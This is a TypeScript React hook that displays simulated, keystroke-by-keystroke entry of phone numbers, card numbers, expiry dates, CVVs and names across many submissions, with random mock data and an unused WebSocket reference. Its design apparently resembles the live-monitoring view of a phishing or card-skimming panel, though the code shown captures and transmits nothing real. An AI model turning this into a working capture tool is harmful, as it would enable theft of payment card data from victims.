import { useState, useEffect, useRef, useCallback } from 'react';

interface RealtimeInput {
  phone?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  name?: string;
}

interface KeystrokeUpdate {
  submissionId: string;
  field: keyof RealtimeInput;
  value: string;
  action: 'type' | 'delete' | 'clear';
  timestamp: number;
}

interface FieldState {
  value: string;
  isTyping: boolean;
  lastUpdate: number;
  cursorPosition?: number;
}

interface SubmissionFieldStates {
  [submissionId: string]: {
    [field: string]: FieldState;
  };
}

interface SubmissionState {
  [submissionId: string]: {
    isSubmitting: boolean;
    lastSubmitTime?: number;
  };
}

const TYPING_TIMEOUT = 500; // 500ms后停止显示打字状态

export function useKeystrokeMonitor(initialSubmissions: any[]) {
  const [submissions, setSubmissions] = useState(initialSubmissions);
  const [fieldStates, setFieldStates] = useState<SubmissionFieldStates>({});
  const [submissionStates, setSubmissionStates] = useState<SubmissionState>({});
  const wsRef = useRef<WebSocket | null>(null);
  const simulationRef = useRef<{[key: string]: NodeJS.Timeout}>({});
  const typingTimeoutsRef = useRef<{[key: string]: NodeJS.Timeout}>({});

  // 模拟表单提交
  const simulateSubmission = useCallback((submissionId: string) => {
    setSubmissionStates(prev => ({
      ...prev,
      [submissionId]: {
        isSubmitting: true,
        lastSubmitTime: Date.now()
      }
    }));

    // 3秒后清除提交状态
    setTimeout(() => {
      setSubmissionStates(prev => ({
        ...prev,
        [submissionId]: {
          isSubmitting: false,
          lastSubmitTime: prev[submissionId]?.lastSubmitTime
        }
      }));
    }, 3000);
  }, []);

  // 清除打字状态
  const clearTypingState = useCallback((submissionId: string, field: string) => {
    const key = `${submissionId}-${field}`;
    if (typingTimeoutsRef.current[key]) {
      clearTimeout(typingTimeoutsRef.current[key]);
    }
    
    typingTimeoutsRef.current[key] = setTimeout(() => {
      setFieldStates(prev => ({
        ...prev,
        [submissionId]: {
          ...prev[submissionId],
          [field]: {
            ...prev[submissionId]?.[field],
            isTyping: false
          }
        }
      }));
    }, TYPING_TIMEOUT);
  }, []);

  // 处理单个键输入
  const handleKeystroke = useCallback((update: KeystrokeUpdate) => {
    const { submissionId, field, value, action, timestamp } = update;

    // 更新字段状态
    setFieldStates(prev => ({
      ...prev,
      [submissionId]: {
        ...prev[submissionId],
        [field]: {
          value,
          isTyping: true,
          lastUpdate: timestamp,
          cursorPosition: value.length
        }
      }
    }));

    // 更新提交数据
    setSubmissions(prev => prev.map(submission => {
      if (submission.id === submissionId) {
        return {
          ...submission,
          realtimeInput: {
            ...submission.realtimeInput,
            [field]: value
          },
          lastUpdated: timestamp
        };
      }
      return submission;
    }));

    // 设置清除打字状态的延时
    clearTypingState(submissionId, field);
  }, [clearTypingState]);

  // 模拟实时按键输入
  const simulateTypingSequence = useCallback((submissionId: string, field: keyof RealtimeInput, finalValue: string) => {
    let currentValue = '';
    const chars = finalValue.split('');
    
    chars.forEach((char, index) => {
      const delay = Math.random() * 200 + 50; // 50-250ms between keystrokes
      
      setTimeout(() => {
        currentValue += char;
        handleKeystroke({
          submissionId,
          field,
          value: currentValue,
          action: 'type',
          timestamp: Date.now()
        });
      }, delay * index);
    });
  }, [handleKeystroke]);

  // 模拟编辑和删除操作
  const simulateEditingSequence = useCallback((submissionId: string, field: keyof RealtimeInput, oldValue: string, newValue: string) => {
    let currentValue = oldValue;
    let step = 0;
    
    // 计算需要删除的字符数
    const deletions = Math.max(0, oldValue.length - newValue.length);
    const commonPrefix = getCommonPrefix(oldValue, newValue);
    const charsToDelete = oldValue.length - commonPrefix.length;
    const charsToAdd = newValue.substring(commonPrefix.length);

    // 删除字符
    for (let i = 0; i < charsToDelete; i++) {
      setTimeout(() => {
        currentValue = currentValue.slice(0, -1);
        handleKeystroke({
          submissionId,
          field,
          value: currentValue,
          action: 'delete',
          timestamp: Date.now()
        });
      }, (step++) * (Math.random() * 100 + 50));
    }

    // 添加新字符
    charsToAdd.split('').forEach((char, index) => {
      setTimeout(() => {
        currentValue += char;
        handleKeystroke({
          submissionId,
          field,
          value: currentValue,
          action: 'type',
          timestamp: Date.now()
        });
      }, (step++) * (Math.random() * 100 + 50));
    });
  }, [handleKeystroke]);

  // 获取公共前缀
  const getCommonPrefix = (str1: string, str2: string): string => {
    let i = 0;
    while (i < str1.length && i < str2.length && str1[i] === str2[i]) {
      i++;
    }
    return str1.substring(0, i);
  };

  // 生成随机模拟数据
  const generateRandomValues = useCallback(() => {
    const phoneTemplates = ['138', '139', '186', '188', '199'];
    const cardPrefixes = ['4321', '5555', '6226', '4532'];
    const names = ['张小明', '李小红', '王大强', '赵用户', '陈用户'];
    
    return {
      phone: `${phoneTemplates[Math.floor(Math.random() * phoneTemplates.length)]}${String(Math.floor(Math.random() * 100000000)).padStart(8, '0')}`,
      cardNumber: `${cardPrefixes[Math.floor(Math.random() * cardPrefixes.length)]} ${String(Math.floor(Math.random() * 10000)).padStart(4, '0')} ${String(Math.floor(Math.random() * 10000)).padStart(4, '0')} ${String(Math.floor(Math.random() * 10000)).padStart(4, '0')}`,
      expiryDate: `${String(Math.floor(Math.random() * 12) + 1).padStart(2, '0')}/${String(Math.floor(Math.random() * 5) + 24)}`,
      cvv: String(Math.floor(Math.random() * 900) + 100),
      name: names[Math.floor(Math.random() * names.length)]
    };
  }, []);

  // 开始实时模拟
  useEffect(() => {
    const startSimulation = () => {
      const simulate = () => {
        if (submissions.length === 0) return;

        // 随机选择一个提交和字段
        const randomSubmission = submissions[Math.floor(Math.random() * submissions.length)];
        const fields: (keyof RealtimeInput)[] = ['phone', 'cardNumber', 'expiryDate', 'cvv', 'name'];
        const randomField = fields[Math.floor(Math.random() * fields.length)];
        
        const currentValue = fieldStates[randomSubmission.id]?.[randomField]?.value || 
                           randomSubmission.realtimeInput?.[randomField] || '';
        
        const randomValues = generateRandomValues();
        const newValue = randomValues[randomField];

        // 20% 概率触发表单提交
        if (Math.random() < 0.2) {
          simulateSubmission(randomSubmission.id);
        } else {
          // 50% 概率全新输入，50% 概率编辑现有内容
          if (Math.random() > 0.5 || !currentValue) {
            simulateTypingSequence(randomSubmission.id, randomField, newValue);
          } else {
            simulateEditingSequence(randomSubmission.id, randomField, currentValue, newValue);
          }
        }

        // 随机间隔：1-5秒
        const nextDelay = Math.random() * 4000 + 1000;
        simulationRef.current['main'] = setTimeout(simulate, nextDelay);
      };

      // 开始第一次模拟
      simulate();
    };

    startSimulation();

    return () => {
      // 清理所有定时器
      Object.values(simulationRef.current).forEach(timeout => clearTimeout(timeout));
      Object.values(typingTimeoutsRef.current).forEach(timeout => clearTimeout(timeout));
    };
  }, [submissions, fieldStates, simulateTypingSequence, simulateEditingSequence, generateRandomValues]);

  const isFieldTyping = useCallback((submissionId: string, field: string): boolean => {
    return fieldStates[submissionId]?.[field]?.isTyping || false;
  }, [fieldStates]);

  const getFieldValue = useCallback((submissionId: string, field: keyof RealtimeInput): string => {
    return fieldStates[submissionId]?.[field]?.value ||
           submissions.find(s => s.id === submissionId)?.realtimeInput?.[field] ||
           'N/A';
  }, [fieldStates, submissions]);

  const isSubmitting = useCallback((submissionId: string): boolean => {
    return submissionStates[submissionId]?.isSubmitting || false;
  }, [submissionStates]);

  return {
    submissions,
    isFieldTyping,
    getFieldValue,
    fieldStates,
    isSubmitting
  };
}
